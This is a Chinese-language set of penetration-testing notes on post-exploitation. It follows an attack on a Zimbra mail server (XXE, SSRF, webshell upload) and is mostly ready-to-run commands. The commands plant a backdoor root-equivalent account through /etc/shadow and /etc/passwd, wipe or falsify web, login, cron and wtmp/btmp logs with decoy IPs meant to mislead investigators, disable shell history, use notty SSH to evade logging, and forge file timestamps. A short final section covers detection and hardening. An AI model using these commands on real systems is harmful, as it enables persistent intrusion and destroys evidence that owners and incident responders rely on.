![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689908869220-d4c7c2a8-bbe6-4460-8897-30d8275f40f5.png)

### 修改shadow和passwd文件进行登录

<https://3gstudent.github.io/Linux%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81Hash-%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F%E4%B8%8E%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86>

/etc/shadow和/etc/passwd是Linux系统中存储用户账户信息的两个重要文件。

1. /etc/passwd文件： /etc/passwd文件包含了系统上所有用户账户的基本信息，每个用户占据一行记录。每条记录包含以下字段：

- 用户名：用于登录系统的用户名。
- 密码占位符：通常是'x'，密码实际存储在/etc/shadow文件中。
- 用户ID（UID）：一个唯一的数字，用于标识用户。
- 组ID（GID）：指定用户所属的主要组。
- 用户描述信息：可以是用户的全名或其他相关信息。
- 家目录：用户的个人工作目录。
- 登录Shell：用户登录后默认使用的Shell。

2. /etc/passwd文件是所有用户可读的，但只有root用户可以修改它。它存储了基本的用户信息，但不包含密码信息。
3. /etc/shadow文件： /etc/shadow文件存储了系统上所有用户账户的加密密码以及其他与安全相关的信息。每个用户占据一行记录。每条记录包含以下字段：

- 用户名：对应于/etc/passwd文件中的用户名。
- 加密密码：经过加密算法处理后的用户密码。
- 最后一次修改密码的日期：以天数表示，自1970年1月1日以来的天数。
- 密码有效期：密码过期前经过的天数。
- 密码变更提前通知天数：在密码过期之前多少天开始提醒用户修改密码。
- 密码最短使用期限：从修改密码后开始的天数，之前不能再次修改密码。
- 密码最长使用期限：在密码过期之前的最长天数。
- 密码过期警告期：在密码过期之前多少天开始提醒用户密码即将过期。
- 密码不可用期：密码修改后，禁止使用旧密码的天数。
- 账户过期日期：账户过期的日期，以天数表示。
- 保留字段：保留供将来使用的字段。

4. /etc/shadow文件的权限设置为只有root用户可读写，这样确保了密码信息的安全性。

当我们拿下root权限，可以进行权限维持，通过复制root用户的/etc/shadow文件和/etc/passwd文件对应行，修改其他用户名，即可达到添加新用户，并可以使用ssh登录。

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689907835826-c5f3bf2f-7cce-4ba2-959c-34c278c8e1e8.png)

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689907847203-1a9df968-29b1-4155-934e-27e6bce3d879.png)

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689907871072-66d84746-966e-4384-b5e2-6e04e45dc063.png)

### zimbra日志分析

当我们对网站进行攻击，并且拿下了网站的shell之后，需要对我们的攻击痕迹进行清除，也要对网站进行扫描，观察是否该服务器曾经被其他人员攻击。

#### 网站日志

**我们使用前面的攻击经过了三个步骤：**

1.利用XXE漏洞获取到zimbra账号和密码；

2.利用ssrf和zimbra接口调用获取到高权限token；

3.利用高权限token上传webshell进行连接；

zimbra网站日志目录地址为：

/opt/zimbra/log

##### 步骤一痕迹

在步骤一中，我们主要是使用XXE漏洞来远程读取../conf/localconfig.xml文件的内容来获取zimbra用户的账号密码，访问的接口是/Autodiscover/Autodiscover.xml

因此我们这里搜索日志中包含/Autodiscover/Autodiscover.xml的部分。

查看日志中是否存在访问/Autodiscover/Autodiscover.xml的日志，并输出文件名

> find /opt/zimbra/log -type f | xargs grep -l -w "/Autodiscover/Autodiscover.xml"

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689927061037-c284968c-7681-4df7-829d-3e2356fe7528.png)

查看该文件中符合条件的行

> grep -r -w "/Autodiscover/Autodiscover.xml" /opt/zimbra/log/access\_log.2023-07-18

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689927123473-cb400a4e-20ca-4ebf-ba7c-ace1733db15f.png)

可以发现可疑ip：192.168.52.1。

**处理办法**

1.如果该ip是我们的ip，那么可以进行痕迹清理；

> sed -i '/192.168.52.1/s/.\*//g' access\_log.2023-07-18

2.如果该ip不是我们的ip，那么需要特别注意，进行记录，有可能是其他同行的攻击痕迹；

##### 步骤二痕迹

在步骤二中，我们是利用ssrf和zimbra接口调用获取到高权限token。

主要利用的特征有如下几个地方

> 1. /service/soap
> 2. /service/admin/soap
> 3. /service/proxy?target=<https://127.0.0.1:7071/service/admin/soap>

查看存在痕迹的日志文件

> find /opt/zimbra/log -type f | xargs grep -l -w "/service/proxy target=<https://127.0.0.1:7071/service/admin/soap>"

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689927959525-538c51cb-9a4b-4ec8-8ec2-5c5a2b2284d3.png)

查看对应的行

> find /opt/zimbra/log -type f | xargs grep -r -w "/service/proxy?target=<https://127.0.0.1:7071/service/admin/soap>"

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689928034199-b29c6f8e-9607-4575-9ad9-acefb485273d.png)

可以发现可疑ip：192.168.52.1。

**处理办法**

1.如果该ip是我们的ip，那么可以进行痕迹清理；

> grep -l '192.168.52.1' /opt/zimbra/log/\* | xargs sed -i '/192.168.52.1/s/.\*//g'

2.如果该ip不是我们的ip，那么基本可以断定该ip为攻击ip，因为使用了ssrf漏洞攻击；

**防御方法**

1.添加waf，过滤数据包中的127.0.0.1、localhost等字符，修补ssrf漏洞；

2.上传最新的内存马，介于网站和后台之间，编写规则过滤敏感数据包；

##### 步骤三痕迹

在步骤三中，我们主要是利用高权限token上传webshell进行连接。

主要的特征如下几个地方

1. /service/extension/clientUploader/upload
2. 上传的木马

查看存在痕迹的文件

> find /opt/zimbra/log -type f | xargs grep -l -w "service/extension/clientUploader/upload"

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689928969977-c59e0f45-7026-4928-ae03-96e877c2c48f.png)

查看对应行

> find /opt/zimbra/log -type f | xargs grep -r -w "service/extension/clientUploader/upload"

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689929292684-bec6a966-f732-49d1-b257-db1008c5d3c1.png)

**处理办法**

> grep -l 'service/extension/clientUploader/upload' /opt/zimbra/log/\* | xargs sed -i '/service\\/extension\\/clientUploader\\/upload/s/.\*//g'

**查找木马**

调用上传接口上传的文件会上传到downloads

> find /opt/zimbra/log -type f | xargs grep -l -w 'downloads'

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689931285868-3e295ab8-c491-4509-aa6a-a36c81115715.png)

连接这个木马势必也会经过这个目录，因此可以作为筛选对象之一。

> find /opt/zimbra/log -type f | xargs grep -r -w 'downloads'
> 
> grep -r -w 'downloads' /opt/zimbra/log/access\_log.2023-07-19

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689931831068-9fe9e7b1-4428-4714-8fae-e67ea4805525.png)

基本可以确定这个木马为shell.jsp

**处理办法**

> grep -l '192.168.52.1' /opt/zimbra/log/\* | xargs sed -i '/192..168.52.1/s/.\*//g'
> 
> **查找其他木马**

查看后续马是否上传了其他的马，但是没办从日志获得post的具体信息，那么我们只能去通过寻找webapp下的路径的jsp类型的文件搜索他们的内容是否有敏感的函数，例如：getClassLoader()函数

> find /opt/zimbra/jetty/webapps/ -type f -name "\*.jsp" | xargs grep -l -w "getClassLoader()"
> 
> ![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689932052942-46ea677f-96ca-4458-bbaf-192e374994e3.png)

打包分析木马

> find /opt/zimbra/jetty/webapps/ -type f -name "\*.jsp" | xargs grep -l -w "getClassLoader()" | xargs tar -cvf shell.tar

或者直接打包jsp后缀文件到本地分析

> find /opt/zimbra/jetty/webapps/ -type f -name "\*.jsp" | xargs tar -cvf shell2.tar

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689932284557-e883b6c8-68e0-413b-a74d-ca760f7e5137.png)

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689932357168-a436f40a-4645-4408-9b3f-5c4056e556fd.png)

**防止其他人继续利用的方法**

1.将web网站目录权限设置为只读，导致无法上传文件；

2.将对方木马设置为只读权限，无法连接；

#### 系统日志

<https://atsud0.me/2022/01/09/Linux%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4%E7%AC%94%E8%AE%B0/#SSH%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87>

<https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-SSH%E6%97%A5%E5%BF%97%E7%9A%84%E7%BB%95%E8%BF%87>

当一个正常的交互式login shell登录后，执行命令时，执行的 **HISTSIZE** 条命令会被记录到缓冲区里，当用户成功注销时，系统会将 **HISTSIZE** 条命令写入到 **HISTFILE** 变量中的文件里面，而 **HISTFILE** 变量默认的位置就是用户家目录下的**.bash\_history（~/.bash\_history）**文件。

1. 只有成功注销时才会缓冲区里的命令写入到**HISTFILE**文件里面。
2. 只会写入**HISTSIZE**条命令到**HISTFILE**文件里。

比较重要的环境变量：

- HISTFILE：保存历史命令的文件
- HISTSIZE：当前会话保存历史命令的数量
- HISTFILESIZE：保存历史命令的文件保存历史命令的数量
- HISTIGNORE ：保存历史时忽略某些命令
- HISTCONTROL ：保存历史时忽略某些命令组合
- SHELLOPTS：记录打开的shell功能选项列表

可以使用命令查看所有的环境变量

> env

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1690040659201-76df0f32-00f1-483d-9b93-8c3b0234f4ca.png)

在linux中，如果想要查看单一的环境变量，可以使用下面的命令

> echo $变量名称

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1690040710054-bcfeecfa-1a7e-43eb-a5a8-46c8a16f5463.png)

##### 登录日志

当我们在渗透过程中，爆破了某台Linux服务器的某个用户的账号，获得了这个账号的密码，或者通过webshell获取到账号密码，这时肯定想登录进去进行后续的渗透工作，但是登录录之后的痕迹、爆破的痕迹要怎么清除呢？

有几个重要的日志文件需要关注

- /var/log/btmp：记录SSH登录错误尝试。 相关命令：lastb
- /var/log/wtmp：记录当前和历史登录系统的用户信息。相关命令：last
- /var/run/utmp：当前正在登录系统的用户信息。 相关命令：w
- /var/log/lastlog：记录用户上次登录信息。
- /var/log/auth.log：认证相关的日志 \[Debian\]
- /var/log/secure：认证相关的日志 \[Centos\]

###### wtmp日志

wtmp日志：记录当前和历史登录系统的用户信息。（相关命令：last）

可以替换日志中的IP信息，把假线索给到溯源人员。延缓他们的溯源工作。

使用last命令，查看当前和历史登录信息。

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1690043681738-f81f70f2-83e4-4c57-910b-6fe2984ea39c.png)

可以发现我们的ip为192.168.52.1，将ip进行替换，达到迷惑攻击者的目的

> utmpdump /var/log/wtmp |sed "s/{your\_ip}/{random\_ip}/g" |utmpdump -r &gt;/tmp/wtmp &amp;&amp; mv /tmp/wtmp /var/log/wtmp
> 
> utmpdump /var/log/wtmp |sed "s/192.168.52.1/114.114.114.114/g" |utmpdump -r &gt;/tmp/wtmp &amp;&amp; mv /tmp/wtmp /var/log/wtmp

1. utmpdump /var/log/wtmp：使用 utmpdump 命令读取 /var/log/wtmp 文件的内容并将其输出到标准输出。utmpdump 命令用于解析和显示登录日志文件的内容。
2. sed "s/192.168.179.1/114.114.114.114/g"：通过管道将前一个命令的输出传递给 sed 命令。sed 是一个流编辑器，该参数用于替换字符串的功能。

- s/192.168.179.1/114.114.114.114/g 是一个替换命令，它将输入流中所有的 "192.168.179.1" 字符串替换为 "114.114.114.114"。其中，s/ 表示替换命令的开始，g 表示全局替换，即替换每一处匹配到的字符串。

3. utmpdump -r：使用 utmpdump 命令将标准输入中经过 sed 处理后的内容重新解析，并将结果输出到标准输出。
4. &gt;/tmp/wtmp：将前一个命令的输出重定向到 /tmp/wtmp 文件。&gt; 表示重定向输出，将输出写入指定的文件中。如果该文件不存在，则会创建新文件；如果文件已存在，则会覆盖原有内容。
5. mv /tmp/wtmp /var/log/wtmp：使用 mv 命令将 /tmp/wtmp 文件移动到 /var/log/wtmp，从而替换原始的登录日志文件。mv 命令用于移动或重命名文件。

综合起来，该命令的作用是读取 /var/log/wtmp 登录日志文件的内容，将其中的字符串 "192.168.52.1" 替换为 "114.114.114.114"，然后重新解析修改后的内容，并将结果保存到临时文件 /tmp/wtmp 中，最后使用 mv 命令将临时文件移动到 /var/log/wtmp，完成对登录日志文件的修改替换操作。

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1690043740452-815d9d19-9ec8-4dac-bbde-98317fe0e92d.png)

**注意：wtmp和btmp不要直接使用sed进行ip替换或者直接删除行，会导致日志格式乱掉或是日志内容被覆盖。**

###### btmp日志

使用lastb命令可以看到有部分登录失败尝试

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1690044873489-3535943e-8d12-4041-af00-ac898f1c43b1.png)

和wtmp文件相同的替换方法。

> utmpdump /var/log/btmp |sed "s/192.168.52.1/8.8.8.8/g" |utmpdump -r &gt;/tmp/btmp &amp;&amp; mv /tmp/btmp /var/log/btmp

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1690044969584-2176adcc-d641-4212-9f1c-1c4d02d2e74d.png)

**注意：wtmp和btmp不要直接使用sed进行ip替换或者直接删除行，会导致日志格式乱掉或是日志内容被覆盖。**

###### lastlog日志

lastlog：记录用户上次登录信息。

直接使用sed命令进行替换即可

> sed -i 's/192.168.52.130/8.8.8.8/g' /var/log/lastlog

或者直接删除

> sed -i '/192.168.52.130/d' /var/log/lastlog

###### auth.log和secure日志

在 Linux 中，登录的日志信息通常存储在 /var/log/auth.log 或 /var/log/secure 文件中，具体取决于你使用的 Linux 发行版和配置。

- /var/log/auth.log：认证相关的日志 \[Debian\]
- /var/log/secure：认证相关的日志 \[Centos\]

你可以使用以下命令来查看登录日志：

> sudo cat /var/log/auth.log
> 
> sudo cat /var/log/secure

这些命令将打印出完整的登录日志文件内容。请注意，需要使用超级用户权限（sudo）运行这些命令才能访问日志文件。

如果你只想查看最近的登录记录，可以使用 tail 命令来显示日志文件的最后几行：

> sudo tail /var/log/auth.log
> 
> sudo tail /var/log/secure

根据你的实际需求，你可以使用其他文本查看工具（如 less、grep 等）来筛选和搜索登录日志文件的特定信息。

只要使用命令即可删除登录日志（根据ip，也可以根据ssh连接的特征）

进入目录/var/log/

> grep -l '192.168.52.130' \* | xargs sed -i '/192.168.52.130/s/.\*//g'
> 
> grep -l 'sshd' \* | xargs sed -i '/sshd/s/.\*//g'

##### 命令执行日志

<https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-SSH%E6%97%A5%E5%BF%97%E7%9A%84%E7%BB%95%E8%BF%87>

<https://atsud0.me/2022/01/09/Linux%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4%E7%AC%94%E8%AE%B0/>

###### 清除~/.bash\_history文件

在渗透过程中，当我们连接上对方的机器，势必要进行命令的执行，而这些命令执行又会记录在对方机器中，假如对方管理员进行危险排查，会直接被发现，这时我们就要对我们执行的命令进行删除操作了。

history (选项)(参数)

n 显示最近的n条记录

-a 将历史命令缓冲区中命令写入历史命令文件中

-c 将目前的shell中的所有 history 内容全部消除 实际为假删除

-r 将历史命令文件中的命令读入当前历史命令缓冲区

-w 将当前历史命令缓冲区命令写入历史命令文件中

-d 删除历史记录中指定的行

查看历史命令

> history

删除历史命令（假删除）

> history -c

历史记录在每次正确的退出shell的时候会存储到 ~/.bash\_history文件中

直接进行编辑该文件能达到清除历史记录的目的

查看历史命令

> cat ~/.bash\_history

在 Linux 中，你可以使用以下命令来清空某个文件的内容：

> &gt; filename
> 
> echo -n &gt; filename

其中，filename 是要清空内容的文件名。

这些命令使用了重定向操作符 &gt; 将一个空字符串写入文件，从而清空了文件的内容。

第二个命令使用了 echo -n 打印一个空字符串，并将其重定向到文件中，也能实现同样的效果。

###### HISTFILE变量

在上文中，我们可以知道，当一个正常的交互式login shell登录后，执行命令时，执行的HISTSIZE条命令会被记录到缓冲区里，当用户成功注销时，系统会将HISTSIZE条命令写入到HISTFILE变量中的文件里面，而HISTFILE变量默认的位置就是用户家目录下的.bash\_history文件。

所以，如果我们在当前会话中临时取消HISTFILE变量，这样就算正常退出会话历史命令也没有地方保存。

> unset HISTFILE

或者也可以将HISTFILE变量的值给到空设备。当正常退出会话时，命令记录也会保存到/dev/null。

> export HISTFILE=/dev/null

###### SHELLOPTS变量

SHELLOPTS变量是记录了当前会话已经打开的功能选项列表。

查看该变量的值

> echo $SHELLOPTS

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1690041274900-38a98c16-8f68-4224-a423-16c878270eff.png)

如果存在history功能即说明会将执行的命令保存到缓冲区中，用户正常退出会话时写入HISTFILE变量中。

我们可以关闭history功能后，将不会记录历史命令执行记录。

> set +o history #关闭history功能
> 
> shopt -u -o history #同set +o history

###### notty绕过命令记录

notty登录的会话，默认关闭history功能，将不会记录历史命令。

> ssh -T user@IP
> 
> echo $SHELLOPTS

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1690041739862-4b101b26-e12c-46d5-a0f4-922b03ea2d22.png)

注意，使用-T参数使用的是非交互式的终端。

使用SSH命令ssh -T root@1.1.1.1 (notty登录)登录系统，可绕过管理员用户w查看。不过管理员可以在进程中发现。(如果使用putty远程连接，此时的类型为pts/1)

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1690046701613-ce76c14d-92f1-4a91-af26-036872e35bb9.png)

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1690046654384-e34a9ee6-6696-4985-8628-573c8db32b30.png)

经测试，使用notty，能够绕过以下日志：

- /var/log/lastlog，记录用户上次登录信息
- /var/log/wtmp，记录当前和曾经登入系统的用户信息，查询命令：last
- /var/run/utmp，记录当前正在登录系统的用户信息，查询命令：w
- ~/.bash\_history，记录从最开始至上一次登录所执行过的命令，查询命令：history

###### HISTFILESIZE和HISTSIZE变量

~/.bashrc文件中保存了重要的环境变量

- HISTFILE：保存历史命令的文件
- HISTSIZE：当前会话保存历史命令的数量
- HISTFILESIZE：保存历史命令的文件保存历史命令的数量
- HISTIGNORE ：保存历史时忽略某些命令
- HISTCONTROL ：保存历史时忽略某些命令组合
- SHELLOPTS：记录打开的shell功能选项列表

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689951124917-c9f122c2-4a94-42be-85bc-bb53d29eb08c.png)

> export HISTFILESIZE=0
> 
> export HISTSIZE=0

或者直接修改~/.bashrc文件

> vim ~/.bashrc

在 Linux 系统中，HISFILESIZE 参数是一个环境变量，用于指定 shell 命令 history 中保存的命令历史记录文件的最大大小。

默认情况下，Linux shell 会将用户的命令历史记录保存在一个文件中，通常是 ~/.bash\_history。HISFILESIZE 参数用于限制该历史记录文件的大小，一旦文件大小超过此限制，较早的命令将被丢弃，以保持文件大小在可接受的范围内。

可以通过在 shell 配置文件（如 ~/.bashrc 或 ~/.bash\_profile）中设置 HISTFILESIZE 变量来指定这个值。

**如果我们吧大小设置为0，那么就没有空间保存任何一条命令，那么就达到了不记录命令执行日志的目的了。**

然后，重新启动或重新加载 shell 配置文件，使设置生效。

请注意，HISFILESIZE 只控制历史记录文件的大小，而不是 shell 的实际记录行数。要控制 shell 历史记录的行数，请使用 HISTSIZE 参数。

此外，还有其他与命令历史相关的环境变量，如 HISTSIZE（设置 shell 命令历史记录中保存的最大行数），HISTCONTROL（控制历史记录中的重复命令和空白命令的保存方式）等。可以通过查看相关文档或使用 help history 命令来获取更多关于这些变量的信息。

修改环境变量之后，就没有执行命令日志了。

修改后，重新加载配置文件即可

> source ~/.bashrc

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689951865423-a9ab43e5-27f2-4785-98b8-cad9bc20c3c9.png)

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689951874089-fbf56807-101a-47fb-a68b-e2897c405270.png)

###### HISTCONTROL变量

命令前带空格隐藏命令记录，但是这个功能取决于**HISTCONTROL**变量的设置。

> export HISTCONTROL=ignoreboth
> 
> export HISTCONTROL=ignorespace
> 
> 在Debian10中，Bash的默认HISTCONTROL变量为**ignoreboth**，而在Centos6中Bash的默认HISTCONTROL是**ignoredups**。

**ignoredups**是忽略连续两条以上的重复命令。

**ignoredspace**是忽略命令开头带有空格的命令。

**ignoredboth**等价于ignoredups和ignorespace的组合，即忽略开头带空格的命令，又忽略连续两条以上重复的命令。

只有**HISTCONTROL=ignorespace**或者是**ignoreboth**时，才会忽略命令前带空格的命令。

很多命令即使开头是空格，仍然可以正确执行，因此，在配置了这个环境变量后，执行命令时带上开头空格，命令记录就会被隐藏。

##### 计划任务日志

在进行渗透或者提权的过程中，也会使用到计划任务进行提权或者执行命令等操作。

计划任务日志一般保存在/var/log/cron.log中，用于记录 cron 任务的执行情况。在 Linux 系统中，cron 是一个计划任务程序，用于在预定时间自动执行指定的命令或脚本。

当 cron 任务被执行时，相关的执行信息（例如执行时间、执行结果等）会被记录在 /var/log/cron.log 文件中。这个文件通常由系统管理员使用，用于跟踪和检查 cron 任务的执行情况，以便及时发现问题、调试任务和进行故障排除。

注意，每个用户的 cron 任务执行情况都会被记录在不同的日志文件中，例如 /var/log/cron.log 可能是在某些 Linux 发行版中的默认日志文件位置，但也可能因系统配置而有所不同。因此，如果想要查看特定用户的 cron 任务执行情况，需要查找该用户的特定日志文件。

使用命令将对应操作删除

> sed -i '/{命令特征}/d' /var/log/cron.log

##### **修改文件时间戳**

在我们更新了文件之后，应该修改其时间戳，防止被发现修改文件。

一般情况下有四个类型的时间戳

- Access：该时间戳表示文件的访问时间（atime），即最近一次读取或访问文件的时间。
- Modify：该时间戳表示文件的修改时间（mtime），即最近一次修改文件内容的时间。
- Change：该时间戳表示文件状态的更改时间（ctime），即文件元数据（如权限、所有者等）发生变化的时间。注意，文件状态的更改也包括修改文件内容。
- Birth：该时间戳表示文件的创建时间（btime），即文件被创建的时间。但是，并非所有文件系统都支持记录文件的创建时间，因此该时间戳可能不是所有系统上都可用。

查看时间戳

> stat /var/log/wtmp

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1690044537510-1b6606e6-e400-4ea4-9fcc-21c0e04e2cd5.png)

这里我们可以使用touch命令修改access和modify时间戳

> touch -a -d "YYYY-MM-DD HH:MM:SS"/path/to/file
> 
> touch -m -d "YYYY-MM-DD HH:MM:SS"/path/to/file
> 
> touch -a -d "2021-1-1 12:13:14" /var/log/wtmp
> 
> touch -m -d "2021-1-1 12:13:14" /var/log/wtmp

如果想要修改change和birth时间戳，无法使用touch命令修改，只能通过复制文件的方式进行修改。

1. 创建一个副本文件：

> cp /path/to/source/file /path/to/destination/file

2. 删除原始文件：

> rm /path/to/source/file

3. 将副本文件重命名为原始文件名：

> mv /path/to/destination/file /path/to/source/file

##### 防御和检测

###### 防止环境变量的修改

通过修改/etc/skel/.bashrc和每个用户的~/.bashrc可以简单防止下攻击者直接清除历史命令。

添加以下内容到末尾
=========

> readonly HISTFILE
> 
> readonly HISTFILESIZE
> 
> readonly HISTSIZE
> 
> readonly HISTCMD
> 
> readonly HISTCONTROL
> 
> readonly HISTIGNORE

注意：该方法有局限性，攻击者可以修改~/.bashrc删掉readonly的配置，再去修改环境变量。

###### notty的检测

1. 查看TCP连接 netstat -vatn
2. 进程中查看有无ssh notty进程，ssh进程数量是否和w显示当前登录用户数量一致。ps -aux|grep notty